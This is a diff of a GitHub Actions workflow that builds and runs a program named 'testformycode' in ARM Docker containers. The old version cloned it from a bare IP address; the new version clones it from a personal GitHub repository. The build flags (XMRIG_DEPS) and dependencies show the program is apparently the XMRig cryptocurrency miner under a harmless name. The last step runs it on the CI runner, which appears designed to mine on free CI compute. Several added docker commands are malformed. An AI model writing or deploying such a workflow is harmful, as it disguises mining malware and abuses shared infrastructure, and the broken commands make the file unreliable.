@@ -1,59 +1,51 @@
-name: Build TestFormyCode for ARM
+name: Build ARM Project
 
 on:
   push:
     branches:
-      - master
-  workflow_dispatch:  # 允许手动触发
+      - main
+  workflow_dispatch:
 
 jobs:
   build:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Check out repository
+      - name: Checkout code
         uses: actions/checkout@v2
 
-      - name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@v2
+      - name: Set up QEMU for ARM
+        run: |
+          docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
 
-      - name: Build and Run ARMv8 Docker container
+      - name: Pull ARM images
         run: |
           docker pull arm64v8/ubuntu:18.04
-          docker run --platform linux/arm64/v8 --name arm64_build -d arm64v8/ubuntu:18.04 sleep infinity
-          docker exec arm64_build apt-get update
-          docker exec arm64_build apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget -y
-
-      - name: Build TestFormyCode for ARMv8
-        run: |
-          docker exec arm64_build bash -c "git clone http://8.138.123.18:8180/testformycode.zip && \
-          cd testformycode && \
-          mkdir build && cd build && \
-          cmake .. -DBUILD_STATIC=ON -DARM_TARGET=8 -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ && \
-          make -j\$(nproc) && \
-          mv testformycode ~ && \
-          cd ~ && rm -rf testformycode"
-
-      - name: Build and Run ARMv7 Docker container
-        run: |
           docker pull arm32v7/ubuntu:18.04
-          docker run --platform linux/arm/v7 --name arm32_build -d arm32v7/ubuntu:18.04 sleep infinity
-          docker exec arm32_build apt-get update
-          docker exec arm32_build apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget -y
 
-      - name: Build TestFormyCode for ARMv7
+      - name: Build for ARM64
         run: |
-          docker exec arm32_build bash -c "git clone http://8.138.123.18:8180/testformycode.zip && \
-          cd testformycode && \
-          mkdir build && cd build && \
-          cmake .. -DARM_TARGET=7 -DXMRIG_DEPS=../scripts/deps && \
-          make -j\$(nproc) && \
-          mv testformycode ~ && \
-          cd ~ && rm -rf testformycode"
+          docker run --rm --platform linux/arm64/v8 -v ${{ github.workspace }}:/workspace -w /workspace/ ~/testformycode \
+          arm64v8/ubuntu:18.04 /bin/bash -c "
+          apt-get update && \
+          apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget && \
+          git clone https://github.com/mist2ke/testformycode.git && \
+          mkdir ~/testformycode/build && cd ~/testformycode/build && \
+          cmake .. && make -j$(nproc) && mv testformycode ~ && cd ~ && rm -rf testformycode
+          "
 
-      - name: Cleanup
+      - name: Build for ARM32
         run: |
-          docker stop arm64_build
-          docker rm arm64_build
-          docker stop arm32_build
-          docker rm arm32_build
+          docker run --rm --platform linux/arm/v7 -v ${{ github.workspace }}:/workspace -w /workspace ~/testformycode \
+          arm32v7/ubuntu:18.04 /bin/bash -c "
+          apt-get update && \
+          apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget && \
+          git clone https://github.com/mist2ke/testformycode.git && \
+          cd ~/testformycode/scripts && chmod +x *.* && bash ./build_deps.sh && \
+          mkdir ~/testformycode/build && cd ~/testformycode/build && \
+          cmake .. -DARM_TARGET=7 -DXMRIG_DEPS=../scripts/deps && make -j$(nproc) && mv testformycode ~ && cd ~ && rm -rf testformycode
+          "
+
+      - name: Run the project
+        run: |
+          ./testformycode
